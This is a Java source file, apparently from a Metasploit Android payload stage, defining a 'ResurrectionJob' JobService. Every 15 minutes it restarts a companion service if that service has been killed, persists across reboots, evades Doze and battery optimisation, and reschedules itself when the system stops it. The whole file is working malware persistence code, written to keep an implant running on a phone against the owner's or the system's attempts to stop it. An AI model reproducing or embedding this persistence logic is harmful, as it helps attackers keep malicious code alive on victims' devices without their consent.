package com.metasploit.stage;

import android.app.job.JobInfo;
import android.app.job.JobParameters;
import android.app.job.JobScheduler;
import android.app.job.JobService;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.PersistableBundle;

/**
 * Periodic JobService — resurrection fallback.
 * Runs every ~15 min (minimum allowed by Android). If DlsService is dead,
 * restarts it. Survives Doze, app standby, and most battery optimisations.
 *
 * Requires BIND_JOB_SERVICE in manifest (system-enforced).
 */
public class ResurrectionJob extends JobService {

    private static final int JOB_ID = 0x4453; // "DS" = 0x4453

    @Override
    public boolean onStartJob(JobParameters params) {
        // Start the service if not running
        if (!WatchdogReceiver.isServiceRunning(this)) {
            Intent svc = new Intent(this, DlsService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(svc);
            } else {
                startService(svc);
            }
        }
        // Reschedule for next period
        schedule(this);
        // No async work needed
        return false;
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        // System wants us to stop — reschedule so we fire again
        schedule(this);
        return false; // no need to retry, schedule will re-fire
    }

    /** Schedule the periodic job. Call from service or receiver. */
    static void schedule(Context ctx) {
        try {
            JobScheduler js = (JobScheduler) ctx.getSystemService(JOB_SCHEDULER_SERVICE);
            if (js == null) return;

            ComponentName cn = new ComponentName(ctx, ResurrectionJob.class);
            JobInfo.Builder b = new JobInfo.Builder(JOB_ID, cn)
                .setPersisted(true) // survives reboot
                .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                b.setPeriodic(15 * 60 * 1000L); // 15 min (minimum)
            } else {
                b.setPeriodic(15 * 60 * 1000L);
            }

            js.schedule(b.build());
        } catch (Exception ignored) {}
    }
}
